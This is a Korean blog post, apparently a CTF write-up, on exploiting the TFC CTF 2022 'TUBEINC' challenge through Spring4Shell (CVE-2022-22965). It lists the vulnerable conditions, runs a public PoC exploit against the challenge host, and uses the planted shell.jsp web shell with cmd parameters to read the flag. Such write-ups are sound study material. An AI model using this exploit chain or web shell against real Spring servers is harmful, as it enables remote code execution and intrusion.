---
layout: post
title: "[TFC CTF 2022] TUBEINC"
categories: [CTF, Writeup]
tags: [Writeup]
date: 2022-08-05 17:06:00 +09:00
author: aestera
---

# TUBEINC

대회 중에는 풀지 못했던 문제인데 Writeup을 보니 재밌어서 정리해본다.

![Untitled](/assets/img/post_images/TUBEINC/main.png)

문제 페이지의 모습이다 크게 얻을 것은 없지만 페이지 하단에 보면

```html
<footer>
  <p>For the complete functionality of the page add the following entries to your DNS configuration and use tube.com:PORT to connect to the platform.<br>
    34.65.33.171 tube.com<br>
    34.65.33.171 legacy.tube.com<br>
    DO NOT USE THIS IN PRODUCTION!</p>
</footer>
```

IP주소와 도메인 주소간 매핑 설정이 보인다.<br>
이를 로컬에서 맞춰주기 위해 host파일(C:\Windows\System32\drivers\etc\hosts)을 변경해야 한다.

*****

# hosts 파일이란?

![Untitled](/assets/img/post_images/TUBEINC/hosts_capture.png)

IP주소와 도메인을 매핑해주어 DNS에서 주소를 제공 받지 않고도 서버를 찾을 수 있게 해주는 리스트이다.<br>
hosts파일을 보면 localhost가 loopback인 127.0.0.1로 설정되어 있는 것을 볼 수 있다.<br><br>

*****

``` 
# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
34.65.33.171 tube.com
34.65.33.171 legacy.tube.com
```

local의 hosts 파일을 위처럼 변경해주고 다시 문제 사이트로 들어가보면 alert 창이 뜬다.<br><br>
![Untitled](/assets/img/post_images/TUBEINC/alert.png)

html 소스코드를 보면 숨어있는 주석을 볼 수 있다.

```html
  <!--
    Important!
    Due to the recent discovery of a major vulnerability of the used framework, this platform is now deprecated (more information at /info).
    It remains available only for backward compatibility reasons.

    DO NOT USE THIS PLATFORM IN PRODUCTION!
  -->
```

/info 경로에 들어가보면

![Untitled](/assets/img/post_images/TUBEINC/info.png)

spring-boot를 사용하고 22년 3월 30일이 마지막 업데이트 인 것으로 보인다.<br>
관련 CVE를 찾아보면 **spring4shell(CVE-2022-22965)** 가 있다.
![Untitled](/assets/img/post_images/TUBEINC/spring4shell.png)

[LunaSec](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)<br>
[Kisa](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=66592)

****

# 취약 조건

- JAVA 9이상
- Apache Tomcat 서버
- Spring Framwork 버전 5.3.0 ~ 5.3.17, 5.2.0 ~ 5.2.19 및 이전 버전
- Spring-webmvc 또는 Spring-webflux 종속성
- WAR 형태로 패키징

****

# Exploit

구글링을 해보면 spring4shell 취약점을 통해 Webshell을 얻을 수 있는 POC가 있다.<br>
[POC](https://github.com/reznok/Spring4Shell-POC)

Exploit POC

```shell
python exploit.py --url "http://legacy.tube.com:49445"
──(dim.,juil.31)─┘
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://legacy.tube.com:49445/shell.jsp?cmd=id
```
![Untitled](/assets/img/post_images/TUBEINC/id.png)

Shell을 땄다. **cmd=cat user.flag** 로 FLAG를 얻었다.

![Untitled](/assets/img/post_images/TUBEINC/flag.png)

